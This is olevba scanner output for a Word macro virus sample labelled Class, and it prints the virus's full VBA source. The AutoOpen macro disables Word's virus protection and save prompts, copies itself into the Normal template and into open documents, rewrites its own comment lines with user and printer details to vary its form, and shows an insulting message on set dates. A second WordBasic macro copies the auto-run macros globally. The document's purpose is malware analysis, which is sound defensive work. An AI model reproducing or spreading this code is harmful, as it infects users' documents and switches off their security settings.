olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-9cfb9b4c2fe23b2f04082145541490fbbdc7c6e0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-9cfb9b4c2fe23b2f04082145541490fbbdc7c6e0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
On Error GoTo out
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
Options.VirusProtection = False
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
Options.SaveNormalPrompt = False
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
Options.ConfirmConversions = False
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
If nt > 70 And ad > 0 Then GoTo out
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
If nt < 70 Then
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
End If
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
host.codemodule.AddFromFile ("c:\class.sys")
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
With host.codemodule
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    For x = 1 To 4
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    .deletelines 1
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    Next x
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
End With
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
If nt < 70 Then
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    With host.codemodule
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    .replaceline 1, "Sub AutoClose()"
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    .replaceline 71, "Sub ToolsMacro()"
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    End With
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
End If
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
With host.codemodule
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    For x = 2 To 72 Step 2
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
    Next x
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
End With
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
out:
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
End Sub
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
Sub ViewVBCode()
'CPRAF6/14/99 10:29:23 AMHP DeskJet on LPT1:EN-APR-99Clippit
End Sub


-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Class.fm-9cfb9b4c2fe23b2f04082145541490fbbdc7c6e0 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'AutoOpen
On Error Resume Next
WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoOpen") + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoClose") + ":AutoClose", "Global:AutoClose"
WordBasic.FileSaveAll 1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
